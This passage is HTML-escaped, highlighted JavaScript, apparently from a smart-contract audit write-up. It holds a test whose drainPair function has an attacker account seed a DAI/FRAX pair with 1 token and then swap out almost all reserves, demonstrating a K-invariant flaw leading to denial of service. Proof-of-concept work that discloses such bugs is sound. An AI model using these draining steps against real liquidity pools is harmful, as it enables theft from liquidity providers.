\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Modified drainPair to use current balances from the pair\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003easync\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003edrainPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairInstance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003et0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003et1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoLowerCase\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoLowerCase\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003et0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003et1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003et0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003et1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Get current balances from the pair contract right before draining\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentBalanceT0InPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003et0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairInstance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentBalanceT1InPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003et1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairInstance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Attacker sends 1 of token0 to the pair to facilitate the first swap\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003et0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairInstance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentBalanceT0InPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentBalanceT0InPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eadd\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Update local tracking\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Attacker swaps out (current balance of token1 - 1) from the pair\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Ensure we don\u0026#39;t try to swap more than available or zero if balance is already 1 or less\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountT1ToSwapOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentBalanceT1InPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) ? \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentBalanceT1InPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esub\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) : \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBigNumber\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountT1ToSwapOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e             \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairInstance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountT1ToSwapOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;0x\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// Get actual balance of t0 after the first swap (it might have changed due to swap mechanics if _k was not 0)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentBalanceT0InPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003et0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairInstance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Get actual balance of t1 after the first swap\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentBalanceT1InPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003et1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairInstance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Attacker sends 1 of token1 to the pair to facilitate the second swap\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003et1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairInstance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentBalanceT1InPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentBalanceT1InPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eadd\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Update local tracking\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Attacker swaps out (current balance of token0 -1) from the pair to leave 1 behind\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// This is to match the PoC\u0026#39;s final state of 1 t0 and 2 t1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountT0ToSwapOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentBalanceT0InPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) ? \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentBalanceT0InPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esub\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) : \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBigNumber\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountT0ToSwapOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairInstance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountT0ToSwapOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;0x\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonly\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;should demonstrate the K value vulnerability leading to DOS\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003easync\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Determine token0 and token1 based on addresses for createPair\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edai\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoLowerCase\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoLowerCase\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edai\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// token0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan 